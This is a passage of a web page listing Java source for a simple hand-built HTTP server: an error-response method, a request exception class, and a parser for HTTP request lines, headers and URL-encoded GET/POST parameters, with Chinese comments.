out.println(<span class="string">"Content-length: "</span> + content.length);</span><br><span class="line">  out.println();</span><br><span class="line">  out.write(content);</span><br><span class="line">  out.flush();</span><br><span class="line">  out.close();</span><br><span class="line">  in.close();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送错误的信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendError</span><span class="params">(<span class="keyword">int</span> errNum, String errMsg)</span> </span>&#123;</span><br><span class="line">        out.println(<span class="string">"HTTP/1.0 "</span> + errNum + <span class="string">" "</span> + errMsg);</span><br><span class="line">        out.println(<span class="string">"Content-type:text/html"</span>);</span><br><span class="line">        out.println();</span><br><span class="line">        out.println(<span class="string">"&lt;html&gt;"</span>);</span><br><span class="line">        out.println(<span class="string">"&lt;meta content=&amp;#39;text/html; charset=gb2312&amp;#39; http-equiv=&amp;#39;Content-Type&amp;#39;/&gt;"</span>);</span><br><span class="line">        out.println(<span class="string">"&lt;head&gt;&lt;title&gt;Error "</span> + errNum + <span class="string">"--"</span> + errMsg + <span class="string">"&lt;/title&gt;&lt;/head&gt;"</span>);</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;"</span> + errNum + <span class="string">" "</span> + errMsg + <span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">        out.println(<span class="string">"&lt;/html&gt;"</span>);</span><br><span class="line">        out.println();</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        System.out.println(errNum + <span class="string">",,,,"</span> + errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>folk\china\http\HTTPRequestException.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> folk.china.http;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTP请求异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wangchen11</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HTTPRequestException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">HTTPRequestException</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>(string);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>folk\china\http\HTTPRequestHeader.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> folk.china.http;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> folk.china.util.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTP请求头</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wangchen11</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HTTPRequestHeader</span> </span>&#123;</span><br><span class="line"> <span class="comment">// 请求类型，是GET还是POST.</span></span><br><span class="line"> <span class="keyword">public</span> String mRequestType = <span class="string">""</span>;</span><br><span class="line"> <span class="comment">// 本地路径</span></span><br><span class="line"> <span class="keyword">public</span> String mLocalUrl = <span class="string">""</span>;</span><br><span class="line"> <span class="comment">// HTTP版本</span></span><br><span class="line"> <span class="keyword">public</span> String mVersion = <span class="string">""</span>;</span><br><span class="line"> <span class="comment">// 所有的Get参数</span></span><br><span class="line"> <span class="keyword">public</span> Map&lt;String, String&gt; mGetValues = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"> <span class="comment">// 所有的Post参数</span></span><br><span class="line"> <span class="keyword">public</span> Map&lt;String, String&gt; mPostValues = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"> <span class="comment">// 所有属性集合</span></span><br><span class="line"> <span class="keyword">public</span> Map&lt;String, String&gt; mProperty = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HTTPRequestHeader <span class="title">parse</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> HTTPRequestException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> parse(inputStream,<span class="keyword">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析得出HTTP请求头</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> charset 指定参数的字符集,null:使用默认字符集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析好的HTTP头。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HTTPRequestException 如果解析时发生异常，将抛出此异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="meta">@SuppressWarnings</span>(<span class="string">"resource"</span>)</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HTTPRequestHeader <span class="title">parse</span><span class="params">(InputStream inputStream, String charset)</span> <span class="keyword">throws</span> HTTPRequestException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HTTPRequestHeader header= <span class="keyword">new</span> HTTPRequestHeader();</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 不要在这里关闭这个scanner！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  Scanner scanner = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">if</span>(charset==<span class="keyword">null</span>)</span><br><span class="line">   scanner = <span class="keyword">new</span> Scanner(inputStream);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">    scanner = <span class="keyword">new</span> Scanner(inputStream,charset);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"unsupport charset!"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  String line = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">if</span>(scanner.hasNextLine())</span><br><span class="line">  &#123;</span><br><span class="line">   line = scanner.nextLine();</span><br><span class="line">   <span class="keyword">if</span>(line.endsWith(<span class="string">"\r"</span>))</span><br><span class="line">   &#123;</span><br><span class="line">    line = line.substring(<span class="number">0</span>, line.length()-<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   String[]items = line.split(<span class="string">" "</span>);</span><br><span class="line">   <span class="keyword">if</span>(items.length!=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"items.length!=3"</span>);</span><br><span class="line">   <span class="comment">//得到请求类型</span></span><br><span class="line">   <span class="keyword">if</span>( (!items[<span class="number">0</span>].equals(<span class="string">"GET"</span>)) &amp;&amp; (!items[<span class="number">0</span>].equals(<span class="string">"POST"</span>)) )</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"Request type not 'GET' or 'POST'!"</span>);</span><br><span class="line">   header.mRequestType = items[<span class="number">0</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//分离URL和GET参数</span></span><br><span class="line">   <span class="keyword">int</span> fristQMarkIndex = items[<span class="number">1</span>].indexOf(<span class="string">'?'</span>);</span><br><span class="line">   <span class="keyword">if</span>(fristQMarkIndex==-<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    header.mLocalUrl = items[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    header.mLocalUrl = items[<span class="number">1</span>].substring(<span class="number">0</span>, fristQMarkIndex);</span><br><span class="line">    header.mGetValues.putAll(</span><br><span class="line">      getParamByString( items[<span class="number">1</span>].substring(fristQMarkIndex+<span class="number">1</span>,items[<span class="number">1</span>].length()),charset ));</span><br><span class="line">   &#125;</span><br><span class="line">   header.mVersion = items[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 碰到空行，如果是GET请求就立即停止解析，如果是POST请求就只读下一行所有内容，下一行内容都是POST的参数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">while</span>(scanner.hasNextLine())</span><br><span class="line">  &#123;</span><br><span class="line">   line = scanner.nextLine();</span><br><span class="line">   <span class="keyword">if</span>(line.endsWith(<span class="string">"\r"</span>))</span><br><span class="line">   &#123;</span><br><span class="line">    line = line.substring(<span class="number">0</span>, line.length()-<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(lineIsEmpty(line))</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span>(header.mRequestType.equals(<span class="string">"POST"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span>(scanner.hasNextLine())</span><br><span class="line">      header.mPostValues.putAll(getParamByString(scanner.nextLine(),charset));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">int</span> fristColonIndex = line.indexOf(<span class="string">":"</span>);</span><br><span class="line">   <span class="keyword">if</span>(fristColonIndex==-<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"line:"</span>+line+<span class="string">" no expected ':'"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    String name = line.substring(<span class="number">0</span>, fristColonIndex);</span><br><span class="line">    String value = line.substring(fristColonIndex+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(value.startsWith(<span class="string">" "</span>))</span><br><span class="line">     value = value.substring(<span class="number">1</span>);</span><br><span class="line">    header.mProperty.put(name,value);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> header;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title">getParamByString</span><span class="params">(String str, String charset)</span> <span class="keyword">throws</span> HTTPRequestException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">  String[]params = str.split(<span class="string">"&amp;"</span>);</span><br><span class="line">  <span class="keyword">for</span>(String param : params)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">int</span> fristEqualIndex = param.indexOf(<span class="string">'='</span>);</span><br><span class="line">   <span class="keyword">if</span>(fristEqualIndex==-<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// throw new HTTPRequestException("params  is not valid!");</span></span><br><span class="line">    <span class="comment">// ignore it </span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   String name = param.substring(<span class="number">0</span>, fristEqualIndex);</span><br><span class="line">   String value = param.substring(fristEqualIndex+<span class="number">1</span>);</span><br><span class="line">   map.put(name, getTranslatedValue(value,charset) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断一行是否除了 空格 \r \t 没有其它字符了</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> line</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">lineIsEmpty</span><span class="params">(String line)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len = line.length();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">char</span> ch = line.charAt(i);</span><br><span class="line">   <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'\r'</span>:</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'\t'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 得到翻译后的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value 翻译前的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> charset 字符集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HTTPRequestException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getTranslatedValue</span><span class="params">(String value, String charset)</span> <span class="keyword">throws</span> HTTPRequestException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">  ByteBuffer byteBuffer = <span class="keyword">new</span> ByteBuffer();</span><br><span class="line">  <span class="keyword">int</span> len = value.length();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">char</span> ch = value.charAt(i);</span><br><span class="line">   <span class="keyword">if</span>(ch==<span class="string">'%'</span>)</span><br><span class="line">   &#123;<span class="comment">//后跟最多两位的十六进制数</span></span><br><span class="line">    <span class="keyword">int</span> onebyte = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(i+<span class="number">2</span>&gt;=len)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">int</span> halfByte = getHexChar(value.charAt(i+<span class="number">1</span>));</span><br><span class="line">     onebyte = halfByte&amp;<span class="number">0x0f</span>;</span><br><span class="line">     <span class="keyword">if</span>(halfByte==-<span class="number">1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">      i++;</span><br><span class="line">      halfByte = getHexChar(value.charAt(i+<span class="number">1</span>));</span><br><span class="line">      <span class="keyword">if</span>(halfByte==-<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">       i++;</span><br><span class="line">       onebyte = (onebyte&lt;&lt;<span class="number">4</span>)|(halfByte&amp;<span class="number">0x0f</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      byteBuffer.put((<span class="keyword">byte</span>)onebyte);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span>(byteBuffer.length()&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span>(charset==<span class="keyword">null</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      builder.append(<span class="keyword">new</span> String(byteBuffer.getBytes(), <span class="number">0</span>, byteBuffer.length()));</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">       builder.append(<span class="keyword">new</span> String(byteBuffer.getBytes(), <span class="number">0</span>, byteBuffer.length(),charset));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"UnsupportedEncodingException:"</span>+e.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     byteBuffer.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    builder.append(ch);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(byteBuffer.length()&gt;<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(charset==<span class="keyword">null</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    builder.append(<span class="keyword">new</span> String(byteBuffer.getBytes(), <span class="number">0</span>, byteBuffer.length()));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     builder.append(<span class="keyword">new</span> String(byteBuffer.getBytes(), <span class="number">0</span>, byteBuffer.length(),charset));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> HTTPRequestException(<span class="string">"UnsupportedEncodingException:"</span>+e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   byteBuffer.clear();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> builder.toString();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getHexChar</span><span class="params">(<span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> halfByte = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)</span><br><span class="line">   halfByte = ch-<span class="string">'0'</span>;</span><br><span class="line">  <span class="keyword">if</span>(ch&gt;=<span class="string">'a'</span>&amp;&amp;ch&lt;=<span class="string">'f'</span>)</span><br><span class="line">   halfByte = ch-<span class="string">'a'</span>+<span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span>(ch&gt;=<span class="string">'A'</span>&amp;&amp;ch&lt;=<span class="string">'F'</span>)</span><br><span class="line">   halfByte = ch-<span class="string">'A'</span>+<span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> halfByte;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">  stringBuilder.append(<span class="string">""</span>+mRequestType+<span class="string">" "</span>+mLocalUrl+<span class="string">"?"</span>+mGetValues.toString()+<span class="string">" "</span>+mVersion);</span><br><span class="line">  stringBuilder.append(<span class="string">"\r\n"</span>);</span><br><span class="line">  <span class="keyword">if</span>(mPostValues.size()&gt;<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   stringBuilder.append(<span class="string">""</span>+mPostValues.toString());</span><br><span class="line">   stringBuilder.append(<span class="string">"\r\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stringBuilder.append(<span class="string">""</span>+mProperty.toString());</span><br><span class="line">  stringBuilder.append(<span class="string">"\r\n"</span>);</span><br><span class="line">  stringBuilder.append(<span class="string">"\r\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">GET / HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: 127.0.0.1:8080</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,* /*;q=0.8</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, sdch</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.1.1885384815.1467970825</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span 